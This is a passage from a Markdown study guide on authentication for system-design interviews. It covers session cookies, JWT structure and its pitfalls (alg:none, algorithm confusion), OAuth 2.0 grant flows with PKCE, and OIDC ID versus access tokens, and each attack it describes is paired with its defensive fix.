# Authentication

## Prerequisites

- **HTTPS & TLS** [Must read] - all auth mechanisms transmit credentials over the wire; plaintext HTTP makes token interception trivial and invalidates every security property covered here. <!-- link: ../components/tls.md -->
- **HTTP Cookies & Headers** [Must read] - session IDs and auth tokens are transmitted via cookies or `Authorization` headers; cookie attributes (HttpOnly, Secure, SameSite) are a primary defence layer discussed throughout. <!-- link: ../components/http.md -->
- **Asymmetric Cryptography** [Recommended] - JWT RS256/ES256 signatures and mTLS client certificates rely on public/private key pairs; understanding key distribution is required to reason about signing algorithm trade-offs. <!-- link: ../algorithms/cryptography.md -->

---

## Table of Contents

- [Quick Decision Guide](#quick-decision-guide)
- [Conceptual Foundations](#conceptual-foundations)
- [Session-Based Authentication](#session-based-authentication)
- [Token-Based Authentication](#token-based-authentication)
- [OAuth 2.0 & OIDC](#oauth-20--oidc)
- [Token Lifecycle Management](#token-lifecycle-management)
- [Multi-Factor Authentication](#multi-factor-authentication)
- [Service-to-Service Authentication](#service-to-service-authentication)
- [Credential Storage & Transmission](#credential-storage--transmission)
- [Production Failure Modes](#production-failure-modes)
- [Common Interview Gotchas](#common-interview-gotchas)
- [Interview Scenario & Debugging Bank](#interview-scenario--debugging-bank)
- [Appendices](#appendices)

---

## TLDR

Authentication is the process of verifying who a principal is — session-based and token-based are the two implementation families, and OAuth 2.0 + OIDC is the delegation and federated identity layer built on top. The core architectural decision is stateful vs stateless: sessions are server-side state with instant revocability; JWTs are self-contained tokens that verify without a database lookup but cannot be revoked before expiry. OAuth 2.0 is a delegated authorization framework, not an authentication protocol — OIDC adds the identity layer on top. In production, the hard problems are not choosing a pattern but the failure modes that emerge from it: session fixation, JWT revocation gaps, OAuth implicit flow token leakage, and refresh token theft with reuse detection.

---

## Quick Decision Guide

**Interviewer TL;DR:** Pattern selection comes before mechanics. Establish the client type and revocation tolerance first — those two answers eliminate most wrong choices before the design discussion starts.

**Mental model:** Auth pattern selection is a three-axis decision: who is the client (browser / mobile / service), who owns the identity (you or a third party), and how quickly must access be revocable.

### Which Auth Pattern?

```text
Who is the client?
  ├─ Browser-based web app
  │    └──▶ Identity managed by a third party (Google, GitHub, Okta)?
  │              ├─ YES ──▶ OAuth 2.0 + OIDC
  │              │           (Authorization Code Flow + PKCE)
  │              └─ NO (you own the identity store)
  │                   └──▶ Multiple services need to verify the same identity?
  │                             ├─ YES ──▶ JWT
  │                             │           (stateless, cross-service verification)
  │                             └─ NO  ──▶ Session-based
  │                                         (simpler, instant revocation, fits monoliths)
  │
  ├─ Mobile / native app (no server-side backend)
  │    └──▶ OAuth 2.0 + OIDC — Authorization Code Flow + PKCE
  │           (PKCE replaces the client secret, which cannot be stored safely in a native app)
  │
  └─ Machine-to-machine (no human user)
       └──▶ Services in the same cluster / mesh?
                 ├─ YES ──▶ mTLS or JWT with service accounts
                 └─ NO  ──▶ OAuth 2.0 Client Credentials Flow
```

### JWT vs Session?

```text
Is instant revocation a hard requirement?
  ├─ YES (financial, medical, high-security)
  │    └──▶ Session-based
  │           (revocation = delete session record; effective immediately)
  │
  └─ NO
       └──▶ Requests spread across multiple independent services?
                 ├─ YES ──▶ JWT
                 │           (each service verifies locally; no shared session store needed)
                 └─ NO
                       └──▶ Shared data store (Redis, DB) already in the stack?
                                 ├─ YES ──▶ Either; prefer sessions for simpler revocation
                                 └─ NO  ──▶ JWT (avoids new infrastructure dependency)
```

### Which OAuth Grant Type?

```text
Does the flow involve a human user?
  ├─ NO ──▶ Client Credentials Flow
  │           (service-to-service; no user consent step, no browser redirect)
  │
  └─ YES
       └──▶ Does the client have a browser?
                 ├─ NO ──▶ Device Authorization Flow
                 │           (TV, CLI, IoT; user approves on a second device)
                 │
                 └─ YES
                       └──▶ Does the client have a secure server-side backend?
                                 ├─ YES ──▶ Authorization Code Flow
                                 │           (client secret stored server-side)
                                 └─ NO (SPA, mobile)
                                          └──▶ Authorization Code Flow + PKCE
                                                (no client secret; code verifier proves intent)

  ⚠  Implicit Flow — deprecated. Access token exposed in URL fragment.
                      Do not use in new systems.
```

> ⚖️ **Decision Framework**
> The two questions that eliminate the most wrong answers in an interview: (1) "Does a human log in, or is this service-to-service?" and (2) "Can you tolerate a window where a revoked credential still has a valid token?" If (2) is no — sessions. If yes but you need cross-service verification — JWTs with short expiry. If a third party owns the identity — OAuth + OIDC.

**Key Takeaway:** Client type and revocation tolerance are the two load-bearing decisions. Everything else — signing algorithms, storage location, grant type — is downstream of these.

---

## Conceptual Foundations

**Interviewer TL;DR:** Authentication (who are you?) and authorization (what can you do?) are separate layers — conflating them is the most common design mistake. Get the vocabulary right before discussing mechanisms.

**Mental model:** Every secured request has three steps in sequence: establish identity (authentication), determine permissions (authorization), enforce access (policy). Each step builds on the previous one; none can substitute for another.

### AuthN vs AuthZ

**Authentication (AuthN):** Verifies the identity of a principal. Output is a verified identity — "this request comes from user ID 42." Says nothing about what that user is allowed to do.

**Authorization (AuthZ):** Determines what an authenticated principal is permitted to do. Given "user ID 42 is authenticated," authorization decides "user ID 42 can read posts but not delete them."

|              | AuthN                              | AuthZ                                 |
| ------------ | ---------------------------------- | ------------------------------------- |
| Question     | Who are you?                       | What can you do?                      |
| Input        | Credential (password, token, cert) | Verified identity + resource + action |
| Output       | Principal identity                 | Allow / Deny decision                 |
| Failure mode | Impersonation                      | Privilege escalation                  |

> ⚠️ **Warning / Gotcha**
> OAuth 2.0 is a delegated authorization framework, not an authentication protocol. Using an OAuth access token to answer "who is this user?" without OIDC is a common and exploitable mistake — covered in [OAuth 2.0 & OIDC](#oauth-20--oidc).

For the full authorization treatment (RBAC, ABAC, Zanzibar) see `authorization.md`. <!-- link: ./authorization.md -->

> 🎯 **Interview Lens** > **Q:** What's the difference between authentication and authorization?
> **Ideal answer:** Authentication establishes identity — "this request comes from user 42." Authorization decides what that identity can do — "user 42 can read posts but not delete them." They're separate layers: auth without authz means you know who someone is but haven't decided what they're allowed to do. Confusing the two is how privilege escalation bugs happen — the system authenticates correctly but skips the authz check on a sensitive endpoint.
> **Common trap:** "OAuth handles authentication." OAuth is authorization — it grants access to resources. OIDC is the identity layer on top. Using an OAuth access token to answer "who is this user?" is a design error.
> **Next question:** "Where does JWT fit in — authentication or authorization?" → Both, depending on claims. The signature verifies the token's issuer (authentication). The `roles` or `scope` claims inside inform access decisions (authorization). The token is an authentication artifact; its contents feed authorization.

### Identity, Principals, Claims

**Principal:** Any entity that can be authenticated — a human user, a service, a device, or a background job.

**Identity:** The set of verified attributes that uniquely identify a principal. Not a username — a stable, unique identifier (typically a UUID) plus associated attributes.

**Credential:** The proof a principal presents to assert its identity — passwords, tokens, certificates. Credentials are ephemeral; compromising one compromises the identity until rotated or revoked.

**Claims:** Key-value assertions about a principal, embedded in a token or session:

- **Identity claims:** `sub` (subject / user ID), `email`, `name`
- **Authorization claims:** `roles`, `scopes`, `permissions`
- **Token metadata claims:** `iss` (issuer), `aud` (audience), `exp` (expiry), `iat` (issued at)

Claims are _assertions_, not verified facts — the consumer must trust the issuer. A JWT's `email` claim is only as trustworthy as the signing key that produced it.

> 🧠 **Thought Process**
> Separate identity claims from authorization claims. Identity claims (who) are stable. Authorization claims (what they can do) change as roles evolve. A long-lived token with embedded role claims goes stale the moment permissions change — this is why short expiry or permission-free tokens with server-side lookups are often the right call for permission-sensitive systems.

### Stateful vs Stateless Auth

This is the central architectural tension in authentication design.

**Stateful (server-side sessions):** The server maintains a session store. On each request, the client sends a session ID (typically in a cookie); the server looks it up to retrieve the full session context.

```text
Client ──[session_id cookie]──▶ Server
                                  │
                              session store lookup (Redis / DB)
                                  │
                              session data: user_id, roles, expiry
```

- Verification cost: one store lookup per request (~1ms)
- Revocation: instant — delete the session record
- Scaling: session store must be shared across all server instances

**Stateless (token-based):** All auth information is encoded in the token itself. The server verifies the token cryptographically — no external lookup.

```text
Client ──[JWT in Authorization header]──▶ Server
                                            │
                                        verify signature (local key or JWKS endpoint)
                                            │
                                        decode claims: user_id, roles, exp
```

- Verification cost: CPU-only signature check (<1ms, no I/O)
- Revocation: impossible before expiry without a blocklist (which reintroduces state)
- Scaling: any server instance can verify any token; no shared store

> ⚖️ **Decision Framework**
>
> | Dimension         | Stateful (Sessions)                   | Stateless (JWT)         |
> | ----------------- | ------------------------------------- | ----------------------- |
> | Revocation        | Instant                               | Delayed (TTL-bound)     |
> | Server state      | Required (session store)              | None                    |
> | Verification cost | DB/cache lookup                       | CPU only                |
> | Token size        | ~32 bytes (opaque ID)                 | ~300–500 bytes          |
> | Cross-service use | Requires shared store                 | Native (verify locally) |
> | Horizontal scale  | Needs sticky sessions or shared store | Trivial                 |
>
> Neither is universally superior. The decision follows from revocability requirements and service topology.

**Key Takeaway:** AuthN and AuthZ are separate layers — design them separately. Stateful vs stateless is an architectural trade-off, not a quality one: stateless wins on scalability and cross-service use; stateful wins on instant revocability.

---

## Session-Based Authentication

**Interviewer TL;DR:** Sessions are server-side state keyed by an opaque ID sent in a cookie. The critical scaling problem is sharing that state across instances — Redis is the standard answer. The critical security problem is regenerating the session ID on login to prevent session fixation.

**Mental model:** A session is a named slot in server memory. The cookie is just the key to that slot — it carries no information itself, which is both its security strength (nothing to forge) and its operational cost (every request needs a store lookup).

### How It Works

```text
1. User submits credentials (POST /login)
         │
         ▼
2. Server verifies credentials against identity store
         │
         ▼
3. Server creates session record:
   { session_id: "abc123...", user_id: 42, roles: ["user"], expires_at: +24h }
   Stored in session store (Redis / DB)
         │
         ▼
4. Server sets cookie:
   Set-Cookie: session_id=abc123...; HttpOnly; Secure; SameSite=Lax; Path=/
         │
         ▼
5. Browser attaches cookie automatically on every subsequent request
         │
         ▼
6. Server receives session_id → looks up in store → retrieves context → processes request
         │
         ▼
7. Logout: server deletes session record → cookie becomes orphaned → access revoked immediately
```

One property worth emphasising: the session ID is opaque — it encodes nothing. An attacker who intercepts it can replay it, but cannot forge a different one or extract information from it. All sensitive data lives server-side.

### Session Storage

#### In-Memory (Process Memory)

Session state lives inside the application process. Zero infrastructure overhead, zero latency.

**Why it fails in production:** State doesn't survive process restarts. With multiple instances, a request routed to a different process finds no session and forces re-login. Only valid for single-instance development environments.

#### Redis

_The standard production choice for session storage._

Sub-millisecond reads, native TTL support (keys auto-expire without a cleanup job), pub/sub for cross-node invalidation, and replication for HA. A single Redis node comfortably handles millions of session keys.

```shell
# Session key pattern
SET session:abc123 '{"user_id":42,"roles":["user"]}' EX 86400
GET session:abc123
DEL session:abc123   # logout
```

Cluster Redis for HA. Use Redis Sentinel or Redis Cluster depending on write volume. The session store is a critical path dependency — its failure equals a site-wide logout.

#### Database (PostgreSQL / MySQL)

Persistent across restarts; queryable for audit and admin use. The cost is latency (~5–15ms per lookup vs ~0.3ms for Redis) and added load on the primary database, which is already under write pressure.

Acceptable for low-traffic admin systems or when session reads are infrequent. Not appropriate as a session store for high-traffic consumer applications.

| Storage   | Latency | Survives Restart       | Shared Across Instances | Best For                  |
| --------- | ------- | ---------------------- | ----------------------- | ------------------------- |
| In-memory | <0.1ms  | No                     | No                      | Dev only                  |
| Redis     | ~0.3ms  | Yes (with persistence) | Yes                     | Production default        |
| DB        | ~5–15ms | Yes                    | Yes                     | Low-traffic / audit needs |

### Cookies — HttpOnly, Secure, SameSite

The session cookie is the attack surface. Each attribute closes a specific vector.

**`HttpOnly`:** Prevents JavaScript from reading the cookie via `document.cookie`. Eliminates session theft via XSS — a script injected by an attacker cannot extract the session ID.

**`Secure`:** Cookie is only transmitted over HTTPS. Prevents the session ID from being sent over plaintext HTTP, which would expose it to network-level interception.

**`SameSite`:** Controls whether the browser sends the cookie on cross-site requests.

| Value    | When Cookie Is Sent                             | CSRF Protection | Notes                                                               |
| -------- | ----------------------------------------------- | --------------- | ------------------------------------------------------------------- |
| `Strict` | Same-origin requests only                       | Full            | Breaks OAuth redirect flows — user returning from IdP loses session |
| `Lax`    | Same-origin + top-level navigations (GET links) | Partial         | Modern browser default; protects against most CSRF                  |
| `None`   | All requests, including cross-origin            | None            | Requires `Secure`; needed for embedded iframes, third-party auth    |

**`Lax` is the right default** for most session cookies. `Strict` breaks common auth redirect patterns. `None` is required only for cross-origin embedded contexts.

**`Domain` and `Path`:** Scope the cookie to specific subdomains or URL paths. A session cookie scoped to `.example.com` is shared across `api.example.com` and `app.example.com` — useful for SSO across subdomains but widens the exposure surface.

> ⚠️ **Warning / Gotcha** > `SameSite=Strict` is frequently suggested as "more secure" in interviews. The correct answer is that it breaks OAuth and SAML redirect flows — the user is redirected back from the IdP to your app, which is technically a cross-site navigation, and the session cookie is not sent. The user appears logged out immediately after being redirected back from login. `Lax` provides meaningful CSRF protection without breaking these flows.

### Tradeoffs & Scaling Challenges

#### Horizontal Scaling — Sticky Sessions vs Shared Store

With multiple server instances, session lookup fails if the request lands on an instance that doesn't have the session.

**Sticky sessions (session affinity):** The load balancer routes all requests from the same client to the same backend instance (by IP hash or cookie). Avoids the need for a shared store.

Problems: defeats load balancing (one overloaded instance, others idle), instance failure loses all sessions pinned to it, doesn't work with auto-scaling where instances appear and disappear.

**Shared session store (Redis):** All instances read from the same store. Stateless backends — any instance handles any request. This is the correct approach for horizontally scaled systems.

#### Session Fixation

An attacker sets a known session ID on the victim's browser before they log in (by injecting a `Set-Cookie` via a subdomain takeover or HTTP response). After the victim logs in, the server associates their identity with that attacker-known ID. The attacker now holds a valid, authenticated session.

**Fix:** Always regenerate the session ID upon successful authentication. The pre-login session ID is discarded; a new unpredictable one is issued post-login.

```python
def login(username, password):
    if verify_credentials(username, password):
        session.invalidate()          # destroy pre-login session
        session.regenerate_id()       # new session ID post-login
        session['user_id'] = user.id
```

#### Session Hijacking

Attacker steals a valid session cookie (via XSS, network interception, or log exposure) and replays it.

Mitigations in order of effectiveness:

1. `HttpOnly` + `Secure` flags — close the two primary theft vectors
2. Short session TTL — limits the window of a stolen session
3. Absolute expiry + idle timeout — cap the maximum session lifetime regardless of activity
4. Rotate session ID on privilege change (password update, role change) — reduces exposure window after partial compromise

> 🎯 **Interview Lens** > **Q:** How do you handle session management in a horizontally-scaled system?
> **Ideal answer:** Move session state out of the application process into a shared external store — Redis is the standard. All instances read from the same Redis cluster; any instance can serve any request. Sticky sessions are an anti-pattern: they defeat load balancing and cause session loss on instance failure.
> **Common trap:** "Use sticky sessions." Interviewers follow up with "what happens when that instance goes down?" — the candidate then has no answer.
> **Next question:** "The Redis session store goes down. What happens?" → Every user is effectively logged out on their next request. Mitigation: Redis HA (Sentinel / Cluster), circuit breaker to degrade gracefully, or a fallback to allow read-only access for cached sessions.

**Key Takeaway:** Sessions are operationally simple but require a shared store to scale horizontally. Redis is the default. The two non-negotiable security rules: always regenerate session ID on login (fixation), always set `HttpOnly` + `Secure` on the cookie (hijacking).

---

## Token-Based Authentication

**Interviewer TL;DR:** A JWT is a signed JSON payload — the signature lets any service verify it without calling back to the issuer. The hard problems are not the format but the consequences of statelessness: you cannot revoke a JWT before it expires, key rotation requires coordination, and two widely-exploited vulnerabilities (`alg:none` and algorithm confusion) come from trusting the token's own header.

**Mental model:** A JWT is a tamper-evident envelope. Anyone who trusts the issuer's public key can open it and read the claims — but they must verify the seal before trusting what's inside.

### Structure, Signing Algorithms & JWKS

_Three base64url segments: `header.payload.signature`. The header names the algorithm and key ID; the payload carries signed claims; the signature proves neither was tampered with._

A JWT is **signed, not encrypted** — the payload is base64url-encoded and readable by anyone who intercepts the token. For full anatomy, algorithm selection (HS256 / RS256 / ES256), JWKS endpoint mechanics, and zero-downtime key rotation, see [JWT](./jwt.md).

The one decision that matters most here: **use asymmetric keys (RS256 or ES256) for any multi-service system**. With a symmetric key (HS256), any service that can verify a token can also forge one — a single compromised service can mint tokens for any user.

### Claims

**Registered claims** (IANA-defined, short names to keep token compact):

| Claim | Full Name  | Meaning                                               |
| ----- | ---------- | ----------------------------------------------------- |
| `sub` | Subject    | Unique identifier of the principal                    |
| `iss` | Issuer     | Who issued the token (URI)                            |
| `aud` | Audience   | Who the token is intended for                         |
| `exp` | Expiration | Unix timestamp after which the token is invalid       |
| `nbf` | Not Before | Unix timestamp before which the token is invalid      |
| `iat` | Issued At  | Unix timestamp of issuance                            |
| `jti` | JWT ID     | Unique ID for this token — used for replay prevention |

**Public claims:** Custom claims registered with IANA or using collision-resistant URIs (`https://example.com/roles`). Safe to use across systems.

**Private claims:** Agreed-upon between specific parties. Not registered, no collision protection — fine within a closed system, problematic when tokens cross system boundaries.

> ⚠️ **Warning / Gotcha**
> Always validate `aud`. A token issued for `api.example.com` should be rejected by `admin.example.com`. Many libraries skip audience validation unless explicitly configured. An attacker who obtains a token for a low-privilege service can replay it against a higher-privilege service if `aud` is not checked.

### Opaque Tokens vs JWTs

|                      | Opaque Token                                  | JWT                                             |
| -------------------- | --------------------------------------------- | ----------------------------------------------- |
| Format               | Random string (no embedded data)              | Self-contained signed payload                   |
| Verification         | Must call introspection endpoint or DB lookup | Local signature check                           |
| Revocation           | Instant (delete from store)                   | Impossible before `exp` without a blocklist     |
| Token size           | Small (~32 bytes)                             | Larger (~300–500 bytes)                         |
| Information exposure | None (opaque to client)                       | Payload is base64-decoded by anyone             |
| Best for             | High-security, needs instant revocation       | Distributed systems, cross-service verification |

Opaque tokens are strictly more revocable; JWTs are strictly more scalable. Many production systems use both: a short-lived JWT as the access token (15 min expiry limits the revocation gap) and an opaque token as the refresh token (stored server-side, revocable).

### Stateless Verification & Its Gotchas

#### Revocation Gap

A JWT is valid until `exp`. If a user is banned, their account deleted, or their session force-logged-out, any JWT they hold remains valid for the remainder of its lifetime.

Mitigations:

- Short-lived access tokens (15 min) — limits the window, doesn't eliminate it
- Token blocklist in Redis — check `jti` against a blocklist on each request. Reintroduces I/O on the verification path, partially negating the stateless benefit. Justified for high-security actions (admin operations, financial transactions).
- Per-user token version counter — store a `token_version` in the user record; embed it in the JWT. On verification, check that the JWT's version matches the DB. Forced logout increments the counter. One DB read per request, but a single field rather than a full session lookup.

#### Clock Skew

JWT expiry is compared against the verifying server's clock. Servers in a distributed system have clocks that diverge by tens to hundreds of milliseconds. A token with `exp` exactly at the current time may be accepted by one instance and rejected by another.

Standard practice: add a small `leeway` (30–60 seconds) to the expiry check. All major JWT libraries support this as a configuration parameter.

#### `alg:none` Attack

The JWT header specifies the algorithm. Some libraries, if not explicitly configured, accept `alg: "none"` — meaning no signature is required. An attacker changes the header to `{"alg":"none"}`, strips the signature, and the library accepts the forged token.

**Fix:** Always explicitly specify the allowed algorithm(s) in the verifier configuration. Never accept `alg: "none"`.

```python
# WRONG — trusts the token's own alg header
jwt.decode(token, key)

# RIGHT — caller dictates allowed algorithms
jwt.decode(token, key, algorithms=["RS256"])
```

#### Algorithm Confusion Attack

Attacker changes `alg` from `RS256` to `HS256` in the token header and re-signs the payload using the server's _public key_ as the HMAC secret (the public key is known — it's at the JWKS endpoint). If the library reads the algorithm from the token header and switches to symmetric verification, it uses the public key as the HMAC secret and the signature validates.

**Fix:** Same as above — always hardcode the allowed algorithm(s) in the verifier. Never allow the token to dictate its own verification algorithm.

> 🎯 **Interview Lens** > **Q:** How would you revoke a JWT before it expires?
> **Ideal answer:** Three options with different trade-offs. (1) Short-lived tokens (15 min) — accept the revocation gap, keep the system stateless. (2) `jti` blocklist in Redis — check on every request; instant revocation but adds I/O. (3) Token version counter in the user record — one DB read per request to check version; revoke all tokens for a user by incrementing the counter. Choose based on security requirements: (1) for most APIs, (2) for high-security actions, (3) as a middle ground.
> **Common trap:** "Just set a very short expiry." The interviewer follows up: "What's the minimum expiry where the system still works?" — with refresh tokens, 15 minutes is viable; without them, short expiry is unusable.
> **Next question:** "How do you rotate the signing key without logging everyone out?" → Publish new key at JWKS endpoint alongside old key, switch signing to new key, wait for all tokens signed with old key to expire (one `exp` window), then remove old key. The `kid` header on each token tells the verifier which key to use.

**Key Takeaway:** JWTs trade revocability for scalability. The two production decisions that matter most: use asymmetric keys (RS256/ES256) for any multi-service architecture, and always pin the allowed algorithm in the verifier — never let the token dictate its own verification.

---

## OAuth 2.0 & OIDC

**Interviewer TL;DR:** OAuth 2.0 is a delegated authorization framework — it lets a user grant a third-party application access to their resources without sharing their password. It does not authenticate the user. OpenID Connect is the identity layer built on top that adds authentication. Know the flows, know why Implicit is deprecated, and know the `aud` validation rule that separates secure OIDC from insecure OAuth-as-auth.

**Mental model:** OAuth is a valet key — it gives a third party limited, scoped access to your resources without handing over the master key. OIDC extends this by also telling the third party who you are.

### Core Roles

| Role                          | What It Is                                             | Example                             |
| ----------------------------- | ------------------------------------------------------ | ----------------------------------- |
| **Resource Owner**            | The user who owns the data                             | The end user logging in             |
| **Client**                    | The application requesting access                      | Your web app, mobile app            |
| **Authorization Server (AS)** | Authenticates the user, issues tokens                  | Google, GitHub, Auth0, your own IdP |
| **Resource Server (RS)**      | Hosts the protected resources, validates access tokens | Your API, Google Drive API          |

The Client and Resource Server are often owned by the same org. The Authorization Server can be external (federated identity) or internal (your own auth service). What matters architecturally: the AS is the trust anchor — every other component trusts what the AS asserts.

### Authorization Code Flow + PKCE

_The correct flow for any client that handles a human user, whether or not it has a server-side backend._

#### Step-by-Step Mechanics

```
1. Client redirects user to Authorization Server:
   GET /authorize
     ?client_id=abc
     &redirect_uri=https://app.example.com/callback
     &response_type=code
     &scope=openid profile email
     &state=xyz789                    ← random value, CSRF protection
     &code_challenge=E9Melhoa2...     ← PKCE: SHA256(code_verifier)
     &code_challenge_method=S256

2. AS authenticates user (login form, MFA, etc.)
   AS shows consent screen: "App wants access to: profile, email"
   User approves.

3. AS redirects back to client:
   GET https://app.example.com/callback
     ?code=SplxlOBeZQQYbYS6WxSbIA    ← short-lived, one-use authorization code
     &state=xyz789                    ← client validates this matches step 1

4. Client exchanges code via back-channel (server-to-server):
   POST /token
     client_id=abc
     client_secret=secret             ← OR code_verifier for public clients (PKCE)
     grant_type=authorization_code
     code=SplxlOBeZQQYbYS6WxSbIA
     redirect_uri=https://app.example.com/callback
     code_verifier=dBjftJeZ4CVP...   ← PKCE: AS verifies SHA256(verifier) == challenge

5. AS responds:
   {
     "access_token": "eyJ...",
     "token_type": "Bearer",
     "expires_in": 3600,
     "refresh_token": "8xLOxBtZp8",
     "id_token": "eyJ..."             ← OIDC only
   }
```

The authorization code (step 3) travels through the browser URL — visible in history and server logs. It is intentionally short-lived (typically 60 seconds) and single-use. The access token never touches the browser URL.

#### PKCE — Proof Key for Code Exchange

PKCE solves the **authorization code interception attack**: a malicious app on the same device intercepts the redirect URI and steals the authorization code.

```
Before the request:
  code_verifier  = random 43–128 char string (kept secret by client)
  code_challenge = Base64Url(SHA256(code_verifier))

Step 1: client sends code_challenge to AS
Step 4: client sends code_verifier to AS
AS verification: SHA256(received_verifier) == stored_challenge?
```

Even if an attacker intercepts the authorization code, they cannot exchange it without the `code_verifier` — which was never transmitted. The AS rejects the exchange.

PKCE was originally designed for public clients (mobile, SPA) where a client secret cannot be safely stored. It is now recommended for all clients, including confidential ones with server-side backends.

> 🧠 **Thought Process**
> The `state` parameter is not optional. It binds the callback to the specific request that initiated the flow — if a response arrives without a matching `state`, the client must reject it. This prevents CSRF on the callback endpoint: an attacker cannot trick the user's browser into completing a login with the attacker's authorization code, which would bind the victim's session to the attacker's identity (account linkage attack).

### Client Credentials Flow

_For machine-to-machine communication where no user is involved._

```
Client                         Authorization Server
  │                                    │
  │── POST /token ───────────────────▶ │
  │   client_id=abc                    │
  │   client_secret=secret             │
  │   grant_type=client_credentials    │
  │   scope=reports:read               │
  │                                    │
  │◀─ { access_token, expires_in } ──  │
```

No redirect, no consent screen, no user context. The token is scoped to what the client application is allowed to do — not tied to any user identity.

Use for: background jobs, microservice-to-microservice calls when services live in different trust domains, scheduled data exports.

Do not use when a user action is involved — the token won't carry user identity and access decisions will be made in the client's context, not the user's.

### Device Authorization Flow

_For input-constrained devices that cannot open a browser (smart TV, CLI, IoT)._

```
1. Device requests codes:
   POST /device/code
     client_id=abc
     scope=profile

   Response:
   {
     "device_code": "GmRh....",
     "user_code": "WDJB-MJHT",
     "verification_uri": "https://example.com/device",
     "expires_in": 1800,
     "interval": 5
   }

2. Device displays to user:
   "Go to example.com/device and enter: WDJB-MJHT"

3. Device polls (every 5 seconds):
   POST /token
     grant_type=urn:ietf:params:oauth:grant-type:device_code
     device_code=GmRh....
     client_id=abc

   Responses: { "error": "authorization_pending" }  ← keep polling
              { "error": "slow_down" }               ← increase interval
              { access_token, refresh_token, ... }   ← user approved

4. User goes to verification_uri on phone/laptop, enters user_code, authenticates, approves.
```

The `user_code` is intentionally short and human-typeable. The `device_code` is the machine-readable half — never displayed to the user.

### Implicit Flow — Why It's Deprecated

_The access token lands in the URL fragment — browser history, server logs, and every script on the page can read it._

The Implicit Flow was designed for SPAs before PKCE existed. Instead of a code that gets exchanged, the access token is returned directly in the URL fragment after the redirect.

```
GET https://app.example.com/callback
  #access_token=eyJ...              ← token in URL fragment
  &token_type=Bearer
  &expires_in=3600
```

**Why this is a problem:**

1. **Fragment in browser history** — the access token is stored in the browser's navigation history. Anyone with access to the browser (shared machine, browser sync) has the token.
2. **Logged by referrer headers** — if the page loaded after the redirect makes any external requests, the fragment can appear in server logs via the `Referer` header.
3. **Accessible to all scripts on the page** — `location.hash` is readable by any JavaScript running on the page, including third-party analytics or CDN-hosted libraries.
4. **No refresh tokens** — the flow was designed to be short-lived; refresh tokens were considered too risky for public clients.
5. **No back-channel exchange** — the token is issued without any proof that the right party received it (no code verifier, no client secret).

Authorization Code + PKCE solves all of these: the access token is exchanged via a POST request to the token endpoint (not the browser URL), and PKCE proves the right client is performing the exchange.

> ⚠️ **Warning / Gotcha**
> You will still encounter Implicit Flow in legacy systems and older documentation. The RFC was updated (OAuth 2.0 Security Best Current Practice) to explicitly state it should not be used for new deployments. If a system you are reviewing uses `response_type=token`, flag it.

### OpenID Connect — ID Token vs Access Token

_OIDC adds authentication on top of OAuth's authorization: the ID token tells the client who the user is; the access token tells the resource server what the client can do._

OIDC is a thin layer on top of OAuth 2.0. It adds:

1. **ID Token** — a JWT containing identity claims about the authenticated user
2. **UserInfo Endpoint** — returns additional user claims given an access token
3. **Discovery Document** — `/.well-known/openid-configuration` — machine-readable metadata (endpoints, supported algorithms, supported scopes)

The critical distinction between the two tokens:

|                          | ID Token                                   | Access Token                                  |
| ------------------------ | ------------------------------------------ | --------------------------------------------- |
| **Audience (`aud`)**     | The client application (client_id)         | The resource server (API)                     |
| **Purpose**              | Tells the client who the user is           | Lets the client call the resource server      |
| **Consumer**             | The client application                     | The resource server                           |
| **Format**               | Always a JWT                               | Opaque or JWT (AS decides)                    |
| **Contains**             | Identity claims: sub, email, name, picture | Authorization scopes                          |
| **Must be validated by** | Client (check aud = client_id, nonce, exp) | Resource server (check aud = API, exp, scope) |

The ID token is for the client. The access token is for the resource server. They should never be used interchangeably.

**Nonce:** A random value included in the authorization request and embedded in the ID token. The client verifies the nonce in the received ID token matches what it sent. This binds the ID token to a specific authentication request — preventing replay attacks where an old ID token is reused.

> 🎯 **Interview Lens** > **Q:** What's the difference between an ID token and an access token in OIDC?
> **Ideal answer:** ID token tells the client who the user is — it's a JWT with identity claims (`sub`, `email`, `name`), audience set to the client's `client_id`, and a `nonce`. The client reads and validates it. Access token tells the resource server what the client is allowed to do — it carries scopes, and its audience is the API. The resource server validates it on every request. They are consumed by different parties for different purposes — never substitute one for the other.
> **Common trap:** "Use the access token to get the user's identity." This is the OAuth-as-authentication mistake. An access token doesn't reliably identify the user to your application.
> **Next question:** "How do you get user profile information in OIDC?" → Either read claims from the ID token directly (for basic profile), or call the UserInfo endpoint with the access token to get additional claims the AS didn't embed in the token.

### OAuth Is Not Authentication — The Common Confusion

_OAuth tokens prove authorization scope, not user identity — a valid access token cannot safely answer "who is this user?" without OIDC._

OAuth 2.0 answers: "Can this client access this resource on behalf of the user?"

It does not answer: "Who is this user?"

An OAuth access token tells the resource server that the bearer has been granted certain scopes. It does not reliably identify the user to your application. The attack vector:

```
Attacker has a valid access token for Service A.
Attacker sends that token to Service B, which uses it as authentication proof.
Service B wrongly concludes: "this token was issued by Google, so the user is authenticated."
But Service B never verified the token was issued FOR IT.
```

The fix is `aud` validation on the ID token:

- ID token's `aud` must equal the client's `client_id`
- If `aud` is a different client's ID, reject the token
- An ID token issued to Service A cannot be replayed to Service B

> 🧠 **Thought Process**
> When you see "login with Google" in a system design, ask: what exactly is Google returning, and what are we doing with it? If the system uses the access token to call `/userinfo` and trusts the response to establish identity — that's correct OIDC usage. If it's using the access token itself as proof of identity (passing it between internal services, storing it as a session credential) — that's the OAuth-as-auth mistake. The interview signal: a strong candidate knows why `aud` exists and can explain what attack it prevents.

OIDC was specifically designed to solve this. If you need to answer "who is this user?" in the context of OAuth flows, use OIDC ID tokens — not access tokens.

**Key Takeaway:** OAuth is authorization, not authentication. OIDC is the identity layer on top. The `aud` claim is the load-bearing security check that separates correct OIDC from exploitable OAuth-as-auth. In all multi-party flows, validate `aud`, `iss`, `nonce`, and `exp` on every ID token — every field exists because a real attack was possible without it.

---

## Token Lifecycle Management

**Interviewer TL;DR:** Access tokens should be short-lived; refresh tokens do the heavy lifting of maintaining sessions without re-authentication. Refresh token rotation with reuse detection is the correct theft-detection mechanism. Logout is harder than it looks — clearing a local cookie does not revoke a JWT or end the session at the IdP.

**Mental model:** Access tokens are day passes — short-lived, limited scope. Refresh tokens are the key to the pass-issuing office — longer-lived, higher value, must be stored carefully and rotated on use.

### Access Token Expiry Tradeoffs

The expiry window on an access token is a direct trade-off between security and operational cost.

| Expiry               | Security                    | AS Load                       | UX Impact                                         |
| -------------------- | --------------------------- | ----------------------------- | ------------------------------------------------- |
| Very short (1–5 min) | Minimal stolen-token window | High (frequent refresh calls) | Invisible with refresh tokens; disruptive without |
